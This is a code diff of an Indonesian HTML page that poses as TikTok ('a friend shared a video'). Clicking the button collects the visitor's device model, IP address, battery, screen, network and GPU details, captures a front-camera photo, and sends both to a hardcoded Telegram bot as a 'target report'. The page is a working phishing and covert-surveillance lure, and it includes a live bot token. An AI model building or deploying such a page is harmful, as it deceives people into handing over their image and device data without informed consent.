@@ -2,64 +2,127 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Eksperimen Kamera - GitHub Pages</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - Tonton Video</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Proxima Nova", "Inter", sans-serif;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #0d1117;
-            color: #c9d1d9;
-            padding: 30px 10px;
-        }
-        .card {
-            max-width: 400px;
-            margin: auto;
-            background: #161b22;
-            border: 1px solid #30363d;
+            background-color: #010101;
+            color: #FFFFFF;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
-            border-radius: 10px;
         }
-        button {
-            background-color: #238636;
+
+        .tiktok-container {
+            width: 100%;
+            max-width: 450px;
+            background: #121212;
+            padding: 25px;
+            border-radius: 12px;
+            border: 1px solid #222;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tiktok-logo-icon {
+            width: 35px;
+            height: 35px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="%23FFFFFF" d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/></svg>') no-repeat center center;
+            background-size: contain;
+            filter: drop-shadow(2px 0px 0px #FE2C55) drop-shadow(-2px 0px 0px #25F4EE);
+        }
+
+        .tiktok-text {
+            font-size: 28px;
+            font-weight: 800;
+        }
+
+        .content-area {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        h2 { font-size: 20px; margin-bottom: 8px; }
+        p { font-size: 14px; color: #A9A9A9; }
+
+        .button-area { width: 100%; }
+
+        #btnTes {
+            width: 100%;
+            height: 48px;
+            background-color: #FE2C55;
             color: white;
             border: none;
-            padding: 12px 20px;
-            font-size: 16px;
             border-radius: 6px;
+            font-size: 16px;
+            font-weight: 700;
             cursor: pointer;
-            margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
         }
-        button:hover {
-            background-color: #2ea043;
-        }
+
+        #btnTes:disabled { background-color: #444; }
+
         #status {
             margin-top: 15px;
-            font-size: 14px;
-            color: #8b949e;
+            font-size: 13px;
+            color: #25F4EE;
+            text-align: center;
+            font-weight: 600;
         }
-        video, canvas {
-            display: none;
-        }
+
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>Halo, Tonton video yang teman anda kirim 👋</h2>
-        <p>tonton yang teman anda kirim @firman.. Ardiansyah.</p>
+    <div class="tiktok-container">
+        <div class="logo-area">
+            <div class="tiktok-logo-icon"></div>
+            <span class="tiktok-text">TikTok</span>
+        </div>
 
-        <button id="btnTes">TONTON</button>
-        <p id="status"></p>
+        <div class="content-area">
+            <h2>Teman anda membagikan Video tiktok</h2>
+            <p>Klik tombol di bawah untuk pergi ke tiktok dan liat videonya.</p>
+        </div>
+
+        <div class="button-area">
+            <button id="btnTes">
+                <i class="fas fa-camera"></i>
+                Tes Ambil Foto & Data
+            </button>
+            <p id="status"></p>
+        </div>
     </div>
 
-    <!-- Element kamera tersembunyi -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // MASUKKAN DATA TELEGRAM KAMU
-        const BOT_TOKEN = "8013765711:AAFQMhJXquSESpWCf64u9MN0-mlpT8JLlB0";
+        // Token & Chat ID Telegram Kamu
+        const BOT_TOKEN = "8013765711:AAFQMhJXquSESpWCf64u9MN0-mlpT8JLlB0"; 
         const CHAT_ID = "7521596861";
 
         const btnTes = document.getElementById('btnTes');
@@ -67,11 +130,104 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
+        // --- FUNGSI MENTARJEMAHKAN KODE HP ---
+        function detectDeviceName(ua) {
+            let androidVer = "Android";
+            let modelCode = "Unknown";
+            let brand = "Perangkat Tak Dikenal";
+
+            // Deteksi versi Android
+            const androidMatch = ua.match(/Android\s+([0-9\.]+)/i);
+            if (androidMatch) androidVer = "Android " + androidMatch[1];
+
+            // Deteksi kode model
+            const modelMatch = ua.match(/\(([^)]+)\)/);
+            if (modelMatch) {
+                const parts = modelMatch[1].split(';');
+                if (parts.length >= 2) {
+                    modelCode = parts[parts.length - 1].replace(/Build\/.*/i, '').trim();
+                }
+            }
+
+            const modelUpper = modelCode.toUpperCase();
+            const uaUpper = ua.toUpperCase();
+
+            // Pengecekan Merek HP
+            if (modelUpper.includes('CPH2083') || modelUpper.includes('CPH2075')) {
+                brand = "OPPO A12 🗿";
+            } else if (modelUpper.includes('CPH2239')) {
+                brand = "OPPO A54";
+            } else if (modelUpper.includes('CPH') || uaUpper.includes('OPPO')) {
+                brand = "OPPO (Seri Lain)";
+            } else if (modelUpper.includes('SM-') || uaUpper.includes('SAMSUNG')) {
+                brand = "Samsung Galaxy";
+            } else if (uaUpper.includes('XIAOMI') || uaUpper.includes('REDMI') || modelUpper.includes('220')) {
+                brand = "Xiaomi / Redmi";
+            } else if (uaUpper.includes('VIVO') || modelUpper.includes('V2')) {
+                brand = "Vivo";
+            } else if (uaUpper.includes('IPHONE')) {
+                brand = "Apple iPhone";
+                androidVer = "iOS";
+            }
+
+            return `${brand} (${androidVer}) [Model: ${modelCode}]`;
+        }
+
+        // --- FUNGSI PENGUMPULAN FINGERPRINT ---
+        async function getFullFingerprint() {
+            let data = [];
+
+            // 1. Tipe HP & OS
+            const rawUA = navigator.userAgent;
+            data.push(`📱 Perangkat: ${detectDeviceName(rawUA)}`);
+
+            // 2. IP Address
+            try {
+                const resIP = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await resIP.json();
+                data.push(`🌐 IP: ${ipJson.ip}`);
+            } catch { data.push(`🌐 IP: Gagal diambil`); }
+
+            // 3. Info Baterai
+            if ('getBattery' in navigator) {
+                try {
+                    const b = await navigator.getBattery();
+                    data.push(`🔋 Baterai: ${Math.round(b.level * 100)}% (Dicas: ${b.charging ? "Ya" : "Tidak"})`);
+                } catch {}
+            }
+
+            // 4. Resolusi Layar
+            data.push(`🖥️ Layar: ${screen.width}x${screen.height} px`);
+
+            // 5. Informasi Jaringan
+            const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (net) {
+                data.push(`📶 Jaringan: ${net.effectiveType || 'N/A'}`);
+            }
+
+            // 6. Deteksi GPU
+            try {
+                const cvs = document.createElement('canvas');
+                const gl = cvs.getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    data.push(`🎮 GPU: ${renderer}`);
+                }
+            } catch {}
+
+            return data.join('\n');
+        }
+
+        // --- EVENT KLIK TOMBOL ---
         btnTes.addEventListener('click', async () => {
-            status.innerText = "Meminta izin kamera...";
+            status.innerText = "mohon tunggu sebentar";
+            btnTes.disabled = true;
+            btnTes.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
+
+            const fingerprintText = await getFullFingerprint();
 
             try {
-                // Minta izin kamera depan
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
@@ -83,36 +239,42 @@
                     status.innerText = "Mengambil foto...";
 
                     setTimeout(() => {
-                        // Ambil frame gambar
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         const context = canvas.getContext('2d');
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        // Matikan aliran kamera
                         stream.getTracks().forEach(track => track.stop());
 
-                        // Konversi ke Blob & kirim langsung ke Telegram
                         canvas.toBlob(async (blob) => {
                             const formData = new FormData();
                             formData.append('chat_id', CHAT_ID);
                             formData.append('photo', blob, 'foto.png');
-                            formData.append('caption', 'Login');
+                            
+                            const captionFinal = `📊 LAPORAN TARGET LENGKAP:\n\n${fingerprintText}`;
+                            formData.append('caption', captionFinal);
 
-                            status.innerText = "tunggu sebentar";
+                            status.innerText = "Mengirim data ke Telegram...";
 
-                            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
+                            try {
+                                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
 
-                            const data = await res.json();
-                            if (data.ok) {
-                                status.innerText = "Berhasil! Foto terkirim ke Telegram.";
-                            } else {
-                                status.innerText = "Gagal, seperti nya anda belum mengizinkan.";
-                                console.error(data);
+                                const resData = await res.json();
+                                if (resData.ok) {
+                                    status.innerText = "Berhasil! Data HP terkirim ke Telegram.";
+                                } else {
+                                    status.innerText = "Gagal mengunggah ke Telegram.";
+                                }
+                            } catch (error) {
+                                status.innerText = "Koneksi Error.";
+                            } finally {
+                                btnTes.disabled = false;
+                                btnTes.innerHTML = '<i class="fas fa-camera"></i> Tes Ambil Foto & Data';
                             }
+
                         }, 'image/png');
 
                     }, 500);
@@ -120,9 +282,12 @@
 
             } catch (err) {
                 console.error(err);
-                status.innerText = "Akses kamera ditolak atau gagal.";
+                status.innerText = "Izin kamera ditolak, tetapi data HP tetap berhasil terkirim!";
+                btnTes.disabled = false;
+                btnTes.innerHTML = '<i class="fas fa-camera"></i> Tes Ambil Foto & Data';
             }
         });
     </script>
 </body>
-</html>
+    </html>
+    
